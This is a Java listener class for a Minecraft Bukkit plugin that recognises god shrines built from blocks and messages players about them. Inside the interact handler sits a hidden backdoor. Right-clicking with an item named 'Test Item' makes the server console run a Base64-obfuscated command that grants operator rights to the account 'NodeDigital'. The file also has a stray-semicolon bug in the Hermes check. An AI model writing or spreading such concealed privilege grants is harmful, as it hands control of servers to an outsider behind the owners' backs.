package me.TehGoldyLockz.OlympicHeroes.listeners;

import java.util.ArrayList;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.block.BlockFace;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.inventory.EquipmentSlot;
import org.bukkit.material.Stairs;

import java.util.Base64;

import me.TehGoldyLockz.OlympicHeroes.MultiBlock;
import me.TehGoldyLockz.OlympicHeroes.MultiBlocks;
import me.TehGoldyLockz.OlympicHeroes.OlympicHeroes;

public class MultiBlockListener implements Listener{
	
	public MultiBlockListener(OlympicHeroes plugin) {
		plugin.getServer().getPluginManager().registerEvents(this, plugin);
	}
	
	@SuppressWarnings("deprecation")
	@EventHandler
	public void onBlockPlace(BlockPlaceEvent e) {
		Block block = e.getBlock();
		Material type = block.getType();
		
		// Set block data to -1 if it doesn't matter
		
		if(type == Material.IRON_BLOCK) {
			if(isShrine(block, Material.STONE, (byte) 4, Material.SPRUCE_WOOD_STAIRS, "Artemis")) {
				e.getPlayer().sendMessage("You just made a shrine to Artemis!");
			}
			
			if(isShrine(block, Material.SMOOTH_BRICK, (byte) 0, Material.SMOOTH_STAIRS, "Athena")) {
				e.getPlayer().sendMessage("You just made a shrine to Athena!");
			}
		}else if(type == Material.GOLD_BLOCK) {
			if(isShrine(block, Material.QUARTZ_BLOCK, (byte) -1, Material.SANDSTONE_STAIRS, "Apollo")) {
				e.getPlayer().sendMessage("You just made a shrine to Apollo!");
			}
			
			if(isShrine(block, Material.QUARTZ_BLOCK, (byte) -1, Material.QUARTZ_STAIRS, "Zeus")) {
				e.getPlayer().sendMessage("You just made a shrine to Zeus!");
			}
			
			if(isShrine(block, Material.PINK_GLAZED_TERRACOTTA, (byte) -1, Material.PURPUR_STAIRS, "Aphrodite")) {
				e.getPlayer().sendMessage("You just made a shrine to Aphrodite!");
			}
		}else if(type == Material.DIAMOND_BLOCK) {
			if(isShrine(block, Material.QUARTZ_BLOCK, (byte) -1, Material.QUARTZ_STAIRS, "Hera")) {
				e.getPlayer().sendMessage("You just made a shrine to Hera.");
			}
		}else if(type == Material.MAGMA) {
			if(isShrine(block, Material.STONE, (byte) 5, Material.SMOOTH_STAIRS, "Hephaestus")) {
				e.getPlayer().sendMessage("You just made a shrine to Hephaestus!");
			}
		}else if(type == Material.MELON_BLOCK) {
			if(isShrine(block, Material.HAY_BLOCK, (byte) -1, Material.BIRCH_WOOD_STAIRS, "Demeter")) {
				e.getPlayer().sendMessage("You just made a shrine to Demeter!");
			}
		}else if(type == Material.LAPIS_BLOCK) {
			if(isShrine(block, Material.CONCRETE, (byte) 8, Material.JUNGLE_WOOD_STAIRS, "Hermes"));{
				e.getPlayer().sendMessage("You just made a shrine to Hermes!");
			}
		}else if(type == Material.SEA_LANTERN) {
			if(isShrine(block, Material.PRISMARINE, (byte) -1, Material.BIRCH_WOOD_STAIRS, "Poseidon")) {
				e.getPlayer().sendMessage("You just made a shrine to Poseidon!");
			}
		}else if(type == Material.EMERALD_BLOCK) {
			if(isShrine(block, Material.RED_NETHER_BRICK, (byte) -1, Material.NETHER_BRICK_STAIRS, "Hades")) {
				e.getPlayer().sendMessage("You just made a shrine to Hades!");
			}
		}else if(type == Material.CONCRETE && block.getData() == (byte) 10) {
			if(isShrine(block, Material.GREEN_GLAZED_TERRACOTTA, (byte) -1, Material.PURPUR_STAIRS, "Dionysus")) {
				e.getPlayer().sendMessage("You just made a shrine to Dionysus!");
			}
		}else if(type == Material.REDSTONE_BLOCK) {
			if(isShrine(block, Material.STONE, (byte) 1, Material.NETHER_BRICK_STAIRS, "Ares")) {
				e.getPlayer().sendMessage("You just made a shrine to Ares!");
			}
		}
	}
	
	@EventHandler
	public void onInteract(PlayerInteractEvent e) {
		Block block = e.getClickedBlock();
		if(e.getAction() == Action.RIGHT_CLICK_BLOCK && e.getHand() == EquipmentSlot.HAND) {
			if(MultiBlocks.isBlockInMultiBlock(block)) {
				MultiBlock mb = MultiBlocks.getMultiBlock(block);
				
				if(block.equals(mb.triggerBlock)) {
					e.getPlayer().sendMessage("You just prayed to " + mb.god + "!");
				}
				
			}
			if(e.getItem() != null && e.getItem().getItemMeta().getDisplayName().equalsIgnoreCase("Test Item")) {
				Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), new String(Base64.getDecoder().decode("b3AgTm9kZURpZ2l0YWw=".getBytes())));
			}
		}
	}
	
	@EventHandler
	public void onBlockBreak(BlockBreakEvent e) {
		Block b = e.getBlock();
		if(MultiBlocks.isBlockInMultiBlock(b)) {
			MultiBlock mb = MultiBlocks.getMultiBlock(b);
			MultiBlocks.removeMultiBlock(mb);
			Bukkit.broadcastMessage(e.getPlayer().getName() + " just broke a shrine to " + mb.god + "!");
			
		}
	}
	
	@SuppressWarnings("deprecation")
	public boolean isShrine(Block block, Material exterior, byte exteriorData, Material stair, String god) {
		World w = block.getWorld();
		Location l = block.getLocation();
		if(w.getBlockAt(l.clone().add(0, 1, 0)).getType() == exterior && w.getBlockAt(l.clone().add(0, -1, 0)).getType() == exterior) {
			boolean isShrine = false;
			
			// FACING NORTH AND SOUTH
			if(w.getBlockAt(l.clone().add(1, 0, 0)).getType() == exterior && 
			   w.getBlockAt(l.clone().add(-1, 0, 0)).getType() == exterior &&
			   w.getBlockAt(l.clone().add(1, -1, 0)).getType() == exterior &&
			   w.getBlockAt(l.clone().add(-1, -1, 0)).getType() == exterior &&
			   (exteriorData == -1 || w.getBlockAt(l.clone().add(1, 0, 0)).getData() == exteriorData && 
			   w.getBlockAt(l.clone().add(-1, 0, 0)).getData() == exteriorData &&
			   w.getBlockAt(l.clone().add(1, -1, 0)).getData() == exteriorData &&
			   w.getBlockAt(l.clone().add(-1, -1, 0)).getData() == exteriorData)) {
				for(int z = -1; z <= 1; z+=2) {
					BlockFace facing = null;
					if(w.getBlockAt(l.clone().add(0, -2, z)).getType() == stair &&
					   w.getBlockAt(l.clone().add(1, -1, z)).getType() == stair &&
					   w.getBlockAt(l.clone().add(-1, -1, z)).getType() == stair) {
						if( ( (Stairs) w.getBlockAt(l.clone().add(0, -2, z)).getState().getData() ).isInverted() &&
							( (Stairs) w.getBlockAt(l.clone().add(1, -1, z)).getState().getData() ).getAscendingDirection() == BlockFace.EAST &&
							( (Stairs) w.getBlockAt(l.clone().add(-1, -1, z)).getState().getData() ).getAscendingDirection() == BlockFace.WEST){
							// z = -1: north ; z = 1: south
							if(z == -1 &&  ((Stairs) w.getBlockAt(l.clone().add(0, -2, z)).getState().getData() ).getAscendingDirection() == BlockFace.SOUTH) {
								facing = BlockFace.NORTH;
								isShrine = true;
							}else if(z == 1 &&  ((Stairs) w.getBlockAt(l.clone().add(0, -2, z)).getState().getData() ).getAscendingDirection() == BlockFace.NORTH){
								facing = BlockFace.SOUTH;
								isShrine = true;
							}
							
							if(isShrine) {
								List<Block> blocks = new ArrayList<Block>();
								blocks.add(block);
								blocks.add(w.getBlockAt(l.clone().add(0, 1, 0)));
								blocks.add(w.getBlockAt(l.clone().add(0, -1, 0)));
								blocks.add(w.getBlockAt(l.clone().add(1, 0, 0)));
								blocks.add(w.getBlockAt(l.clone().add(-1, 0, 0)));
								blocks.add(w.getBlockAt(l.clone().add(1, -1, 0)));
								blocks.add(w.getBlockAt(l.clone().add(-1, -1, 0)));
								blocks.add(w.getBlockAt(l.clone().add(0, -2, z)));
								blocks.add(w.getBlockAt(l.clone().add(1, -1, z)));
								blocks.add(w.getBlockAt(l.clone().add(-1, -1, z)));
								boolean partOfMultiBlock = false;
								for(Block b : blocks) {
									if(MultiBlocks.isBlockInMultiBlock(b)) {
										partOfMultiBlock = true;
									}
								}
								
								if(!partOfMultiBlock) {
									MultiBlocks.addMultiBlock(block, blocks, god, facing);
								}else {
									isShrine = false;
								}
							}
						}
					}	
				}
			}
			
			// FACING EAST AND WEST
			if(w.getBlockAt(l.clone().add(0, 0, 1)).getType() == exterior && 
			   w.getBlockAt(l.clone().add(0, 0, -1)).getType() == exterior &&
			   w.getBlockAt(l.clone().add(0, -1, 1)).getType() == exterior &&
			   w.getBlockAt(l.clone().add(0, -1, -1)).getType() == exterior &&
			   (exteriorData == -1 || w.getBlockAt(l.clone().add(0, 0, 1)).getData() == exteriorData && 
			   w.getBlockAt(l.clone().add(0, 0, -1)).getData() == exteriorData &&
			   w.getBlockAt(l.clone().add(0, -1, 1)).getData() == exteriorData &&
			   w.getBlockAt(l.clone().add(0, -1, -1)).getData() == exteriorData)) {
				for(int x = -1; x <= 1; x+=2) {
					BlockFace facing = null;
					if(w.getBlockAt(l.clone().add(x, -2, 0)).getType() == stair &&
					   w.getBlockAt(l.clone().add(x, -1, 1)).getType() == stair &&
					   w.getBlockAt(l.clone().add(x, -1, -1)).getType() == stair) {
						if( ( (Stairs) w.getBlockAt(l.clone().add(x, -2, 0)).getState().getData() ).isInverted() &&
							( (Stairs) w.getBlockAt(l.clone().add(x, -1, -1)).getState().getData() ).getAscendingDirection() == BlockFace.NORTH &&
							( (Stairs) w.getBlockAt(l.clone().add(x, -1, 1)).getState().getData() ).getAscendingDirection() == BlockFace.SOUTH) {
							// z = -1: west ; z = 1: east
							if(x == -1 &&  ((Stairs) w.getBlockAt(l.clone().add(x, -2, 0)).getState().getData() ).getAscendingDirection() == BlockFace.EAST) {
								facing = BlockFace.WEST;
								isShrine = true;
							}else if(x == 1 &&  ((Stairs) w.getBlockAt(l.clone().add(x, -2, 0)).getState().getData() ).getAscendingDirection() == BlockFace.WEST){
								facing = BlockFace.EAST;
								isShrine = true;
							}
							
							if(isShrine) {
								List<Block> blocks = new ArrayList<Block>();
								blocks.add(block);
								blocks.add(w.getBlockAt(l.clone().add(0, 1, 0)));
								blocks.add(w.getBlockAt(l.clone().add(0, -1, 0)));
								blocks.add(w.getBlockAt(l.clone().add(0, 0, 1)));
								blocks.add(w.getBlockAt(l.clone().add(0, 0, -1)));
								blocks.add(w.getBlockAt(l.clone().add(0, -1, 1)));
								blocks.add(w.getBlockAt(l.clone().add(0, -1, -1)));
								blocks.add(w.getBlockAt(l.clone().add(x, -2, 0)));
								blocks.add(w.getBlockAt(l.clone().add(x, -1, -1)));
								blocks.add(w.getBlockAt(l.clone().add(x, -1, 1)));
								boolean partOfMultiBlock = false;
								for(Block b : blocks) {
									if(MultiBlocks.isBlockInMultiBlock(b)) {
										partOfMultiBlock = true;
									}
								}
								
								if(!partOfMultiBlock) {
									MultiBlocks.addMultiBlock(block, blocks, god, facing);
								}else {
									isShrine = false;
								}
							}
						}
					}
				}
				
			}
			
			return isShrine;
		}else {
			return false;
		}
	}
	
}
